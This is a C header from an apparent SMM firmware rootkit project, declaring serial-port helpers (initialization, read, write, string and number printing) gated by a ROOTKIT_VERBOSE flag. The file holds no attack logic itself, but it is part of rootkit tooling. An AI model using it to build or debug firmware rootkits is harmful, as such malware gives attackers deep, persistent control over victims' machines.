#ifndef __smmrootkit_serial_h__
#define __smmrootkit_serial_h__

/*
 * Serial port configuration.
 * For EFI_DEBUG_SERIAL_BUILTIN and EFI_DEBUG_SERIAL_PROTOCOL.
 * Port 0 is the default port on the motherboard
 */
#define SERIAL_BAUDRATE_MAX 115200
#define SERIAL_BAUDRATE 115200
#define SERIAL_PORT_0 0x3F8 

#define ROOTKIT_VERBOSE

#include <Base.h>
#include <Library/IoLib.h>
#include <Library/UefiRuntimeLib.h>


/*
 *Initialize the serial device hardware.
 */
VOID SerialPortInitialize(UINT16 Port, UINTN Baudrate);

/*
 * Write data to serial device.
 */
VOID SerialPortWrite(UINT16 Port, UINT8 Data);

/*
 * Reads data from a serial device.
 */
UINT8 SerialPortRead(UINT16 Port);

/*
 * Writes a nul-terminated string to the serial
 */
VOID SerialPrintString(const char* text);

/*
 * Debug-version of SerialPrintString. Only prints
 * if ROOTKIT_VERBOSE is defined
 */
VOID SerialPrintStringDebug(const char* text);

/*
 * Send 0xA 8 times to test serial output
 */
VOID SerialTest();

/*
 * Send raw data over serial
 */
VOID SerialSendData(const VOID* buf, UINT8 len);

/*
 * Print a number into serial.
 * 
 * @param _v --> the value to print
 * @param _b --> the base to convert to
 */
VOID SerialPrintNumber(INT64 _v, INT64 _b);

/*
 * Debug-version of SerialPrintNumber. Only prints
 * if ROOTKIT_VERBOSE is defined
 */
VOID SerialPrintNumberDebug(UINT64 _v, UINT64 _b);


#endif